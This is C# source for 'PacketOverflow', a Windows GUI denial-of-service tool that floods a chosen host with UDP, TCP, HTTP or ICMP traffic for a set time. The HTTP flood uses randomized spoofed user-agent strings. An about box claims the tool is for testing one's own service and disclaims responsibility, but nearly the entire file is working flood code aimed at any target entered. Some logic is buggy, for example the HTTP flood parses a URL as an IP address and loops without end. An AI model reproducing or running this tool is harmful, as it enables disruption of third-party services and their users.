using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PacketOverflow
{
    public partial class Form1 : Form
    {
        //[!] Define some stuff
        private static string[] HTTP_Methods = { "GET", "HEAD", "POST" };
        private static Stopwatch s = new Stopwatch();
        private static Random R = new Random();
        private static string[] UA =
        {
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Apache/2.4.34 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a1) Gecko/20070308 Minefield/3.0a1",
            "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.157 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "BrightSign/8.0.69 (XT1143)Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.11.2 Chrome/65.0.3325.230 Safari/537.36",
            "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15",
            "Apache/2.4.25 (Debian) (internal dummy connection)",
            "Opera/9.80 (Linux armv7l) Presto/2.12.407 Version/12.51 , D50u-D1-UHD/V1.5.16-UHD (Vizio, D50u-D1, Wireless)",
            "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
            "Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 TV Safari/538.1",
            "Mozilla/5.0 (X11; Fedora;Linux x86; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (X11; U; Linux i586; de; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.24 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.2",
            "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Exabot-Thumbnails)",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.4) Gecko/20100614 Ubuntu/10.04 (lucid) Firefox/3.6.4",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.4) Gecko/20100625 Gentoo Firefox/3.6.4",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (Linux) Cobalt/11.119147-qa (unlike Gecko) Starboard/6, CVA_STB_BCM72604C0/KA99.00.17.09 (Arris, DCX4400, Wired)",
            "Mozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Debian)",
            "BrightSign/7.1.95 (XT1143) Mozilla/5.0 (Unknown; Linux arm) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.6.0 Chrome/45.0.2454.101 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
        };

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.mainPanel.BackColor = Color.FromArgb(20, 22, 21);
            this.mainHub.Visible = false;
        }

        public static string rand_str(int length)
        {
            var r = new Random();
            return new String(Enumerable.Range(0, length).Select(n => (Char)(r.Next(32, 127))).ToArray());
        }

        private void history_write(string IP, string PORT, string TIME, string METHOD, string CURR_TIME)
        {
            var n = dataGridView1.Rows.Add();
            dataGridView1.Rows[n].Cells[0].Value = IP;
            dataGridView1.Rows[n].Cells[1].Value = PORT;
            dataGridView1.Rows[n].Cells[2].Value = TIME;
            dataGridView1.Rows[n].Cells[3].Value = METHOD;
            dataGridView1.Rows[n].Cells[4].Value = CURR_TIME;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("About. \nThis tool was made by 0x00 to help people test their service's strength. \nIt supports a variety of attack vectors, like HTTP or ICMP. \nThis tool was not made to attack random people! \nI am not responsible for any damage you do!", "PacketOverflow | About", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private static void UDPFlood(string Ip, int Port, int time, byte[] data)
        {
            try
            {
                using (UdpClient c = new UdpClient(Port))
                {
                    s.Start();
                    time = time + 1;
                    while (s.Elapsed < TimeSpan.FromSeconds(time))
                    {
                        c.Send(data, data.Length, Ip, Port);
                    }
                    s.Stop();
                }
            }
            catch (Exception e)
            {
                MessageBox.Show("Error apeared! \n\n" + e, "PacketOverflow | Error!", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
            }
        }

        private static void TCPFlood(string Ip, int Port, int time, byte[] data)
        {
            IPEndPoint ipEnd = new IPEndPoint(IPAddress.Parse(Ip), Port);
            try
            {
                using (TcpClient c = new TcpClient(Ip, Port))
                {
                    c.Connect(ipEnd);
                    var netstream = c.GetStream();
                    var writer = new StreamWriter(netstream);
                    writer.AutoFlush = true;

                    s.Start();
                    time = time + 1;
                    while (s.Elapsed < TimeSpan.FromSeconds(time))
                    {
                        writer.WriteLine(data);
                    }
                    s.Stop();
                }
            }
            catch (Exception e)
            {
                MessageBox.Show("Error apeared! \n\n" + e, "PacketOverflow | Error!", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
            }
        }

        private static void HTTPFlood(string url, int time)
        {
            try
            {
                s.Start();
                time = time + 1;
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    int PORT = 80;
                    if (url.StartsWith("https://"))
                    {
                        PORT = 443;
                    }
                    else if (url.StartsWith("http://"))
                    {
                        PORT = 80;
                    }
                    IPEndPoint host = new IPEndPoint(IPAddress.Parse(url), PORT);
                    Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sock.Connect(host);

                    while (true)
                    {
                        sock.Send(Encoding.ASCII.GetBytes($"{HTTP_Methods[R.Next(1, HTTP_Methods.Length)]} /?{R.Next(2000)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA[R.Next(1, UA.Length)]}\r\n\r\n"), SocketFlags.None);
                    }
                }
                s.Stop();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error apeared! \n\n" + e, "PacketOverflow | Error!", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
            }
        }

        private static void ICMPFlood(string Ip, int time, int TTL, byte[] data)
        {
            try
            {
                Ping pingSender = new Ping();
                PingOptions options = new PingOptions(TTL, true);
                s.Start();
                time = time + 1;
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    pingSender.Send(Ip, 1, data, options);
                }
                s.Stop();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error apeared! \n\n" + e, "PacketOverflow | Error!", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
            }
        }

        private void button5_Click_1(object sender, EventArgs e)
        {

        }

        private void attackVector_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.KeyChar = (char)Keys.None;
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            if(mainHub.Visible == false)
            {
                mainHub.Visible = true;
            }
            else
            {
                mainHub.Visible = false;
            }
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show("About. \nThis tool was made by 0x00 to help people test their service's strength. \nIt supports a variety of attack vectors, like HTTP or ICMP. \nThis tool was not made to attack random people! \nI am not responsible for any damage you do!", "PacketOverflow | About", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            Environment.Exit(1);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            dataGridView1.DataSource = null;
            dataGridView1.Rows.Clear();
            dataGridView1.Refresh();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                string HOST = host.Text;
                string PAYLOAD = payload.Text;
                int PORT = Convert.ToInt32(port.Text);
                string[] TIME = time.Value.ToString().Split('.');
                int DEF_TIME = Convert.ToInt32(TIME[0]);

                if (HOST.StartsWith("www."))
                {
                    MessageBox.Show("Invalid url detected, please use the full path! (Example: https://www.google.com or http://www.0x00.dev)", "PacketOverflow | Invalid url detected!", MessageBoxButtons.OK, MessageBoxIcon.Question);
                }

                //[!] Checks if payload is empty, default or custom
                if (PAYLOAD == string.Empty)
                {
                    //Generate random string
                    PAYLOAD = rand_str(R.Next(30, 40));
                }
                else if (PAYLOAD == "Enter your payload here or delete this text and leave this empty for a random string.")
                {
                    MessageBox.Show("Maybe change the payload a little :)", "PacketOverflow | Default payload detected!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    PAYLOAD = PAYLOAD + " (Packet sent from PacketOverflow)";
                    byte[] PKT_PAYLOAD = Encoding.ASCII.GetBytes(PAYLOAD);
                    //[!] Launch the attack using the correct vector
                    switch (attackVector.SelectedItem.ToString())
                    {
                        case "UDP":
                            UDPFlood(HOST, PORT, DEF_TIME, PKT_PAYLOAD);
                            history_write(HOST, PORT.ToString(), DEF_TIME.ToString(), "UDP", DateTime.Now.ToString("HH:mm:ss tt"));
                            break;
                        case "TCP":
                            TCPFlood(HOST, PORT, DEF_TIME, PKT_PAYLOAD);
                            history_write(HOST, PORT.ToString(), DEF_TIME.ToString(), "TCP", DateTime.Now.ToString("HH:mm:ss tt"));
                            break;
                        case "HTTP":
                            HTTPFlood(HOST, DEF_TIME);
                            history_write(HOST, PORT.ToString(), DEF_TIME.ToString(), "HTTP", DateTime.Now.ToString("HH:mm:ss tt"));
                            break;
                        case "ICMP":
                            ICMPFlood(HOST, DEF_TIME, 34, PKT_PAYLOAD);
                            history_write(HOST, "XXXX", DEF_TIME.ToString(), "ICMP", DateTime.Now.ToString("HH:mm:ss tt"));
                            break;
                        case "TTL Expiry":
                            ICMPFlood(HOST, DEF_TIME, 1, PKT_PAYLOAD);
                            history_write(HOST, "XXXX", DEF_TIME.ToString(), "TTL EXPIRY", DateTime.Now.ToString("HH:mm:ss tt"));
                            break;
                        default:
                            MessageBox.Show("Please choose a valid attack vector!", "PacketOverflow | Invalid attack vector detected!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            break;
                    }
                }
            }

            //[!] Error!
            catch (Exception ex)
            {
                DialogResult msg = MessageBox.Show("Error apeared! \n\n" + ex, "PacketOverflow | Error!", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
                if (msg == DialogResult.Abort) { Environment.Exit(0); }
                else { }
            }
        }
    }
}